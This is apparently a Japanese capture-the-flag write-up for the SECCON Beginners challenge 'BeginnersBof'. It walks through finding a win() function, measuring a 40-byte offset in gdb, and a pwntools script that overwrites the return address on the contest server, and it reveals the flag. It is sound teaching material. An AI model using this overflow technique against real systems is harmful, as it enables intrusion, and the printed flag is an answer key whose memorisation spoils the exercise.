# BeginnersBof
時間内に解けなかった問題<br>
バッファオーバーフローの問題で，当時解けなかったけど「はじめて学ぶバイナリ解析」読んだ後だとすぐに解くことができた．<br><br>
まずは配布されたサーバーで動いているであろう実行ファイルを`file`コマンドで調べてみる．<br>
~~~
lab@D-PC:/media/sf_host_share$ file chall 

chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=86ef4ca27c36d4407e00eb318b228011ce11ac63, for GNU/Linux 3.2.0, not stripped
~~~
<br>
ここで注意すべき点は32bitじゃなくて64bitの実行ファイルであるということ．gdbでデバッグする前に，配布されたc言語のソースファイルの方も確認してみる．<br><br>

~~~
void win() {
    char buf[0x100];
    int fd = open("flag.txt", O_RDONLY);
    if (fd == -1)
        err(1, "Flag file not found...\n");
    write(1, buf, read(fd, buf, sizeof(buf)));
    close(fd);
}
~~~
<br>
すると，win関数内にflagらしきファイルを開いているコードがあった．main関数からは呼ばれないみたいなので，バッファオーバーフローにてfgets関数のreturnアドレスをwin関数のアドレスに書き換え，win関数を呼び出せばよさそう．というわけでgdbでアドレス検索．
<br><br>
<img width="451" alt="キャプチャ" src="https://user-images.githubusercontent.com/64766627/175052378-851260f4-b9d9-4970-b7c3-d971f25fb9e6.png"><br><br>
gdb内で`p win`と打つだけでwin()のアドレスが0x4011e6であると分かった．便利．次に，リターンアドレスを書き換えるにあたって，入力可能アドレスからリターンアドレスまでのオフセットを知る必要がある．<br><br>

~~~
gdb-peda$ b main

Breakpoint 1 at 0x401267

gdb-peda$ r
~~~
<br>
ブレークポイントをmain()に仕掛け，デバッグ開始．nもしくはsで1行ずつ進めていくと，入力可能箇所が2回出る．1個目が長さ，2個目が文字列なので，ペイロードを送信する場所になるのは2個目となる．1個目はここでは100とし，2個目はAを10回入力することにした．<br><br>
<img width="451" alt="キャプチャ" src="https://user-images.githubusercontent.com/64766627/175055129-ac68c0a6-77dc-4b4c-9b35-5fc09949ac43.png"><br><br>
するとスタック内はこんな感じになった．topから入力したA10個が格納され，top+24以降には長さ0x64(=100)，top+40以降にはmain関数に戻るためのreturnアドレスが入っていることが分かる．これでオフセットが40であることが分かった．あとは問題サーバーにバッファオーバーフローを仕掛けるだけ．同ディレクトリのexploit.pyと同じだが，作成したファイルはこんな感じ．<br><br>

~~~
from pwn import *

#接続先
p=remote("beginnersbof.quals.beginners.seccon.jp", 9000)

#2個目の送信内容
#payload = b'A' * 40 + p64(0x4011e6)
#↑でも可能
payload = b'A' * 40 + pack(0x4011e6, word_size='64', endianness='little')

#1個目の質問に対する返答．長ければ100でも10000でも大丈夫
p.sendline(b"1000")
#2個目の質問でペイロードの送信
p.sendline(payload)
#出力表示
p.interactive()
~~~
<br>
コードの意味はコメントを確認してね．実行ファイルが64bitなのでペイロードを書くときは要注意．実行すればflagが手に入った．

<br>
<details>
<summary>BeginnersBofの答え</summary>
ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}<br><br>
<img width="447" alt="キャプチャ" src="https://user-images.githubusercontent.com/64766627/175057871-2edebda9-6bc0-44b8-b7e5-a45b06065e36.png">

</details>